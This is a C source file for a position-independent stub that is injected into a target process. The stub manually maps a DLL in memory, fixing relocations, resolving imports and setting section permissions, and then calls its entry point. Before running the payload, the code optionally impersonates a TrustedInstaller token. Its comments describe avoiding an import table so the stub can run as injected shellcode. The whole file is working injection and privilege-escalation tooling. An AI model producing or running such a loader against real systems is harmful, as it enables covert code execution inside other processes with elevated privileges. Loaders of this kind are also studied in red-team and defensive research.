// stub.c — position-independent DLL loader, executed inside the target process.
//
// This is compiled to raw, position-independent .text bytes (see the build
// step in the generator) and injected alongside the DLL. All APIs come from
// the ctx function pointers, so the code has no IAT and no relocations.
//
// Hard rules to stay PIC: no string literals, no globals, no switch tables,
// APIs only through ctx pointers.

#include <windows.h>

typedef LPVOID (*fn_va)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (*fn_vp)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE (*fn_ll)(LPCSTR);
typedef FARPROC (*fn_gpa)(HMODULE, LPCSTR);
typedef BOOL (*fn_flush)(HANDLE, LPCVOID, SIZE_T);
typedef BOOL (*fn_set_token)(HANDLE, HANDLE);

struct ctx {
    unsigned char *dll;
    unsigned int dll_len;
    fn_va va;
    fn_vp vp;
    fn_ll ll;
    fn_gpa gpa;
    fn_flush flush;
    void *token;            /* TI impersonation token handle, NULL = none */
    fn_set_token set_token; /* SetThreadToken */
};

__declspec(noinline) void stub(struct ctx *c) {
    unsigned char *raw = c->dll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)raw;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(raw + dos->e_lfanew);
    IMAGE_OPTIONAL_HEADER64 *opt = &nt->OptionalHeader;

    // Impersonate TrustedInstaller on THIS thread before running any payload
    // code (a new thread would drop the impersonation).
    if (c->token)
        c->set_token(NULL, (HANDLE)c->token);

    unsigned char *base = (unsigned char *)c->va(NULL, opt->SizeOfImage,
                                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base)
        return;

    // copy headers
    for (unsigned int i = 0; i < opt->SizeOfHeaders; i++)
        base[i] = raw[i];

    // map sections
    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)((unsigned char *)nt + 4 +
        sizeof(IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData) {
            for (unsigned int j = 0; j < sec[i].SizeOfRawData; j++)
                base[sec[i].VirtualAddress + j] = raw[sec[i].PointerToRawData + j];
        }
    }

    // fix relocations
    ULONG_PTR delta = (ULONG_PTR)base - opt->ImageBase;
    if (delta && opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
        IMAGE_BASE_RELOCATION *reloc = (IMAGE_BASE_RELOCATION *)(base +
            opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress) {
            int n = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *e = (WORD *)(reloc + 1);
            for (int i = 0; i < n; i++) {
                if ((e[i] >> 12) == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR *)(base + reloc->VirtualAddress + (e[i] & 0xFFF)) += delta;
            }
            reloc = (IMAGE_BASE_RELOCATION *)((unsigned char *)reloc + reloc->SizeOfBlock);
        }
    }

    // resolve imports
    if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) {
        IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base +
            opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        for (; imp->Name; imp++) {
            HMODULE h = c->ll((char *)base + imp->Name);
            ULONG_PTR thunk_rva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
            IMAGE_THUNK_DATA64 *thunk = (IMAGE_THUNK_DATA64 *)(base + thunk_rva);
            IMAGE_THUNK_DATA64 *iat = (IMAGE_THUNK_DATA64 *)(base + imp->FirstThunk);
            for (; thunk->u1.AddressOfData; thunk++, iat++) {
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
                    iat->u1.Function = (ULONG_PTR)c->gpa(h, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
                else {
                    IMAGE_IMPORT_BY_NAME *bn = (IMAGE_IMPORT_BY_NAME *)(base + thunk->u1.AddressOfData);
                    iat->u1.Function = (ULONG_PTR)c->gpa(h, bn->Name);
                }
            }
        }
    }

    // section permissions
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE_READ : PAGE_READWRITE;
        DWORD old = 0;
        c->vp(base + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, prot, &old);
    }

    c->flush((HANDLE)-1, NULL, 0);

    // run DllMain
    void *entry = base + opt->AddressOfEntryPoint;
    ((BOOL(WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
}
